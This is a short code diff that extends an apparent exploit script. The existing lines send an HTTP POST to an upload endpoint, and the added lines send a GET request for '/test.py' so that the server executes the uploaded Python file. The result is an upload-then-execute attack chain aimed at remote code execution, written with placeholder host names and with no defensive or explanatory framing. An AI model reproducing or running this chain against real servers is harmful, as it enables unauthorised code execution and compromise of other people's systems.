@@ -23,3 +23,12 @@ Payload = """POST /upload_endpoint HTTP/1.1\r\nHost: server_address\r\nContent-T
 
 SendPayload(Init, Host)
 SendPayload(Payload, Host)
+
+# Define the endpoint to execute the Python script
+execution_endpoint = "/test.py"
+
+# Create an HTTP GET request to trigger the execution
+execution_request = f"GET {execution_endpoint} HTTP/1.1\r\nHost: {Host}\r\n\r\n"
+
+# Send the execution request to the server
+SendPayload(execution_request, Host)
